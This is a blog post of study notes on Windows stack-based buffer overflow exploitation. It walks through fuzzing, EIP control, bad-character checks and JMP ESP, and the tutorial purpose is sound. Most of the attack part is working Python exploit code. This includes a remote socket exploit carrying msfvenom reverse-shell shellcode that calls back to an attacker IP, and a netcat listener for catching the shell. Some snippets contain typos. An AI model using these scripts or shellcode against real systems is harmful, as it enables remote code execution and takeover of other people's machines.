---
title: Notes | Stack-Based Buffer Overflow - Windows
author: Zeropio
date: 2022-07-23
categories: [Notes, Vulnerabilities]
tags: [windows, buffer]
permalink: /notes/vulnerabilities/buffer-overflow-windows
---

Binary exploitation is usually the way to find the most advanced vulnerabilities in programs and operating systems and requires a lot of skill. A buffer overflow occurs when a program receives data that is longer than expected, such that it overwrites the entire buffer memory space on the *stack*. Another basic attack is to overwrite a value on the stack to change the program's behavior. If we are a bit more sophisticated, we can change the address of EIP to an instruction that will execute our shellcode. 

# Debugging Windows Programs

We will be using [x64dbg](https://github.com/x64dbg/x64dbg) as the debugger tool in Windows. With a binary explotation plugin, [ERC.Xdbg](https://github.com/Andy53/ERC.Xdbg). 

Inside **x64dgb** we can use `Ctrl + Enter` to open the command line. We can select a default folder with:
```
ERC --config SetWorkingDirectory <path>
```

To start debugging press `Alt + a` and select a **running** process. If you want to debug system services you must run as **Administrator**. Go to `File > Restart as Admin`.

We can start debugging separately and then attach to it or open the program with **x64dgb**. It is better to run it separately, to ensure we would debug it exactly as it is when run normally. Also some libraries may face some differences.

---

# Local Buffer Overflow

Usually there are four steps:
1. Fuzzing Parameters
2. Controlling EIP
3. Identifying Bad Characters
4. Finding a Return Instruction
5. Jumping to Shellcode


## Fuzzing Parameters

The first step can be accomplished by fuzzing parameters. Depending on the program's size there are different input to fuzz. This are some potential parameters:

| **Field**   | **Example**    |
|--------------- | --------------- |
| *Text Input Fields*  | Program's "license registration" field, Various text fields found in the program's preferences   |
| *Opened Files* | Any file that the program can open |
| *Program Arguments* | Various arguments accepted by the program during runtime |
| *Remote Resources* | Any files or resources loaded by the program on run time or on a certain condition |

Programs usually have these parameters more than one time, so we need to fuzz the ones with a highest possibility of overflows. Look for fields that expect a short input, like a date.  License numbers also tend to have a specific length so that developers may be expecting a certain length only, and if we provide a long enough input, it may overflow the input field. The same applies to opened files, as opened files tend to be processed after being opened. While developers may keep a very long buffer for opened files, certain files are expected to be shorter, like configuration files, and if we provide a long input, it may overflow the buffer. Certain file types tend to cause overflow vulnerabilities, like `.wav` files or `.m3u` files, due to the vulnerabilities in the libraries that process these types of files.

### Fuzzing Text Fields

Let's start creating a long payload:
```console
PS C:\> python -c "print('A'*10000)"
```

Copy it and paste in some fields of the program.

### Fuzzing Opened File

Generate a payload inside a file:
```console
PS C:\> python -c "print('A'*10000, file=open('fuzz.wav', 'w'))"
```

Open the file with our target program while **x64dgb** is debugging. The program may get paused at some points of the debugging due to **breakpoints** or **INT3** instructions, so we can simply click on the **Run** button located at the top bar to continue the execution.

> If you want to skip the manually run go to `Options > Preferences > Events` and un-tick everything under `Break on`. Now it will only stop when the program crash.
{: .prompt-tip}

We can see that the program crash with a message similar to `First chance exception on 41414141`. This mean that the program tried to execute that address. In ASCCII the hex code `0x41` means `A`, so `41414141` -> `AAAA`. Which means that we successfully changed the **EIP**. We can check it in the **register window** on the top right of the program.

## Controlling EIP 

Our next step would be to precisely control what address gets placed in **EIP**. 

### EIP Offset

There are many tricks we can use to find the offset of EIP from our input. One way to do so is to send a buffer half-filled with `A`'s and half-filled with `B`'s, and then seeing which character fills **EIP**. If it gets filled with `0x41`'s, it would indicate it's in the first half, and if it gets filled with `0x42`, it would mean it's in the second half. Once we know which half **EIP** lies in, we can repeat the same procedure with that half and split it into two quarters, and so on, until we pinpoint exactly where **EIP** is.

Another method of finding **EIP**'s offset is by using a unique pattern as our input and then seeing which values fill **EIP** to calculate precisely how far away it is from the beginning of our pattern. For example, we can send a pattern of sequential numbers and see which numbers would fill **EIP**. However, this is not a very practical method, as once numbers start getting larger, it would be difficult to know which number it is since it may be part of one number and part of another number. Furthermore, as numbers start getting 2 or 3 digits long, they would no longer indicate the actual offset since each number would fill multiple bytes.

The best way to calculate the exact offset of **EIP** is through sending a **unique**, **non-repeating pattern of characters**, such that we can view the characters that fill **EIP** and search for them in our unique pattern. Since it's a unique non-repeating pattern, we will only find one match, which would give us the exact offset of **EIP**.

To create the pattern we can use a script in our machine, `/usr/bin/msf-pattern_create`{. :filepath}:
```console
zero@pio$ /usr/bin/msf-pattern_create -l <number of bytes>
```

**x64dgb** gives us the option to create patterns, with the option `--pattern`:
```
ERC --pattern c 5000
```

We can create a Python Script to do all of this:
```python
def eip_offset():
    payload = bytes("<payload>", "utf-8")
    with open('<file name>', 'wb') as f:
    f.write(payload)

eip_offset()
```

### Calculating EIP Offset 

Restart the program (through **x64dgb**) after adding the payload. Select the **EIP** value and:
```console
zero@pio$ /usr/bin/msf-pattern_offset -q <EIP>

[*] Exact match at offset <EIP bytes>
```

ANother way is with **x64dgb**. After getting the **EIP** value. This value is an hex number, get it in ASCII (**x64dgb** gives us the option to see in other values, as ASCII). Now:
```
ERC --pattern o <ASCII value of EIP>
```

### Controlling EIP 

Now that we know where the EIP start, the 4 bytes after this will be inside of the EIP.


```pytohn
def eip_control():
    offset = <bytes to EIP>
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip
    
    with open'<file name>', 'wb') as f:
        f.write(payload)

eip_control()
```

Using the `eip_control()` function we can see that our **EIP** will change to `42424242`, that means `B`. Therefore we have control over the **EIP**. Therefore we have control over the **EIP**.

## Identifying Bad Characters

We need to determine any characters we should avoid using in our payload. A very common bad character is a **null byte** `0x00`, used in Assembly as a string terminator, which tells the processor the string has ended. 

We can create all the characters with:
```
ERC --bytearray
```

We can add a new function to our Python script:
```python
def bad_chars():
    all_chars = bytes([
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        ...SNIP...
        0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])
    
    offset = <bytes>
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars
    
    with open('<file>', 'wb') as f:
        f.write(payload)

bad_chars()
```

Load the file with all the characters. At the bottom right of **x64dgb** we can check the **stack**. Go manually through the stack line by line, checking which characters doesn't appear.

To eliminate the bad characters from the array, we can create a new one with:
```
ERC --bytearray -bytes 0x00
```

## Finding a Return Instruction 

### Subverting Program Flow 

To successfully subvert the program's execution flow, we must write a working address at EIP that leads to an instruction that will benefit us. Currently, we have only written 4 `B`'s to **EIP**, which (obviously) is not a working address, and when the program attempts to go to this address, it will fail, which will lead the entire program to crash. To find an address we can use, we must look at all of the instructions used or loaded by our program, pick one of them, and write its address at **EIP**. 

### Jumping to Stack 

To direct the execution flow to the stack, we must write an address to EIP to do so. This can be done in two ways:
1. Write the ESP address (top of the stack) to EIP, so it starts executing code found at the top stack
2. Using a JMP ESP instruction, which directs the execution flow to the stack

> This DOESN'T work with modern machines
{: .prompt-alert}

### Using ESP Address 

Once we write an address to **EIP** and the program crashes on the return instruction ret, the debugger would stop at that point, and the ESP address at the point would match the beginning of our *shellcode*, similarly to how we saw our characters on the stack when looking for bad characters. It is not a very reliable method on Windows machines. 

### Using JMP ESP 

The more reliable way of executing shellcode loaded on the stack is to find an instruction used by the program that directs the program's execution flow to the stack. We can use several such instructions, but we will be using the most basic one, **JMP ESP**, that jumps to the top of the stack and continues the execution.

To find this instruction, we must look through executables and libraries loaded by our program. This includes:
- The program's `.exe` file
- The program's own `.dll` libraries
- Any Windows `.dll` libraries used by the program

To find a list of all loaded files by the program, we can use `ERC --ModuleInfo`. We find many modules loaded by the program. However, we can skip any files with:
- **NXCompat**: As we are looking for a **JMP ESP** instruction, so the file should not have stack execution protection
- **Rebase** or **ASLR**: Since these protections would cause the addresses to change between runs

As for **OS DLL**, if we are running on a newer Windows version like **Windows 10**, we can expect all **OS DLL** files to have all memory protections present, so we would not use any of them. If we were attacking an older Windows version like **Windows XP**, many of the loaded **OS DLLs** likely have no protections so that we can look for **JMP ESP** instructions in them as well.

The best option is to use an instruction from the program itself, as we'll be sure that this address will exist regardless of the version of Windows running the program.

Pressing `ALT + e` lead to the **Symbols** tab, where we can see all these files. Select our target program and search for `JMP ESP` with `CTRL + f`. We must ensure that the instruction address does not contain any *bad characters*.

If we had a large list of loaded modules, we could search through all of them by right-clicking on the main top right **CPU** pane and selecting `Search For> All Modules> Command`, then entering jmp esp. However, this may return a large list of results, some of which may not be usable.

### Searching for Patterns 

Another example of a basic command to jump to the stack is **PUSH ESP** followed by **RET**. Since we are searching for two instructions, in this case, we should search using the machine code rather than the assembly instructions. Some tool like `msf-nasm_shell` in our machine could be useful. This take an assembly instruction and give us the corresponding machine code. Now, in the **CPU** pane we can press `CTRL + B` and search by the pattern we get.

## Jumping to Shellcode 

### Shellcode Generation 

We have many aviable shellcode in **msfvenom**:
```console
zero@pio$ msfvenom -l payloads
```

Let's take the example of a 32-bit Windows:
```console
zero@pio$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=<ip> LPORT=<port> -f 'python'

buf =  b""
buf += b"\xd9\xec\xba\x3d\xcb\x9e\x28\xd9\x74\x24\xf4\x58\x29"
buf += b"\xc9\xb1\x31\x31\x50\x18\x03\x50\x18\x83\xc0\x39\x29"
buf += b"\x6b\xd4\xa9\x2f\x94\x25\x29\x50\x1c\xc0\x18\x50\x7a"
```

Copy the output to our Python Script:
```python
def exploit():
    # msfvenom -p 'windows/exec' CMD='cmd.exe' -f 'python' -b '\x00'
    buf =  b""
    buf += b"\xd9\xec\xba\x3d\xcb\x9e\x28\xd9\x74\x24\xf4\x58\x29"
    buf += b"\xfd\x2c\x39\x51\x60\xbf\xa1\xb8\x07\x47\x43\xc5"
```

### Final payload 

Now, we know:
- **Buffer**: we can fill the buffer with `A`
- **EIP**: 4 bytes of a address 
- **buf**: shellcode

Modify our Python Script:
```python
def exploit():
    # msfvenom -p 'windows/exec' CMD='cmd.exe' -f 'python' -b \x00
    buf = b""
    buf += b"<payload>"
    buf += b"<payload>"

    offset = <bytes>
    buffer = b"A"*offset
    eip = pack('<L', 0x<address>)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    with open('<file>', 'wb') as f:
        f.write(payload)


exploit()
```

---

# Remote Buffer Overflow 

## Remote Fuzzing 

First see which programs are running through the net:
```console
PS C:\> netstat -a 

TCP 0.0.0.0:8080        0.0.0.0:0      LISTENING
```

We can interact using netcat:
```console
PS C:\> .\nc.exe 127.0.0.1 8080
```

This Python Script will fuzz a remote port, searching the number of bytes which crash:
```python
import socket
from struct import pack


def fuzz():
    try:
        for i in range(0, 10000, 500):
            buffer = b"A"*i
            print("Fuzzing %s bytes" % i)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("127.0.0.1", 8888))
            breakpoint()
            s.send(buffer)
            s.close()
    except:
        print("Could not establish a connection")
```

While the script is working check **x64dgb** to see when the **EIP** is modify. Maybe the script doesn't make the program crash, but It can overwrite the **EIP**. Adding `breakpoint()` after the `s.send(buffer)` we can see when the program crash.

## Building a Remote Exploit 

### Controlling EIP 

Let's create a pattern 2000 bytes long:
```
ERC --pattern c 2000
```

Then use the `eip_offset()` python function modify for remote:
```python
def eip_offset():
    pattern = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"
                    "9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8"
                    "Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7A"
                    "i8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al"
                    "7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6"
                    "Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5A"
                    "r6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au"
                    "5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4"
                    "Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3B"
                    "a4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd"
                    "3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2"
                    "Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1B"
                    "j2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm"
                    "1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0"
                    "Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9B"
                    "s0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu"
                    "9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8"
                    "Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7C"
                    "a8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd"
                    "7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6"
                    "Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5C"
                    "j6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm"
                    "5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co", "utf-8")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 8888))
    s.send(pattern)
    s.close()
```

In **x64dgb** take the **EIP** value after sending the payload and calculate the bytes:
```
ERC --pattern o <pattern in ascii>
```

Now take control of the **EIP** adding 4 characters:
```python
def eip_control():
    offset = 1052
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 8888))
    s.send(payload)
    s.close()
```

### Identifying Bad Characters 

The next step is to identify the bad characters. Remember that we can create a payload with:
```
ERC --bytearray
```

Modify the Python function:
```python
def bad_chars():
    all_chars = bytes([
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        ...SNIP...
        0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])

    offset = 1052
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()
```

Once we run the script compare the actual **ESP** address with a file that the command would create:
```
ERC --compare <ESP address> <path>\ByteArray_1.bin
```

### Finding a Return Instruction 

As in the previous case (local), search for aviable addresses.

### Jumping to Shellcode 

Create a payload and send it:
```python
def exploit():
    # msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.15.10 LPORT=1234 -f 'python'
    buf = b""
    buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
    buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
    buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
    buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
    buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
    buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
    buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
    buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
    buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
    buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
    buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
    buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
    buf += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
    buf += b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
    buf += b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a\x0f\x0a\x68"
    buf += b"\x02\x00\x04\xd2\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
    buf += b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
    buf += b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
    buf += b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
    buf += b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
    buf += b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
    buf += b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
    buf += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
    buf += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
    buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

    offset = 1052
    buffer = b"A"*offset
    eip = pack('<L', 0x0069D2E5)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 8888))
    s.send(payload)
    s.close()
```

## Remote Exploitation 

### Reverse Shell Shellcode

Get our IP and make the payload:
```console
zero@pio$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=<your ip> LPORT=<port> -f 'python'
```

Modify the previous script with the new payload.

### Remote Exploitation 

Open a netcat:
```console
zero@pio$ nc -lvnp 1234 
```

Execute the script and now we should have access.


















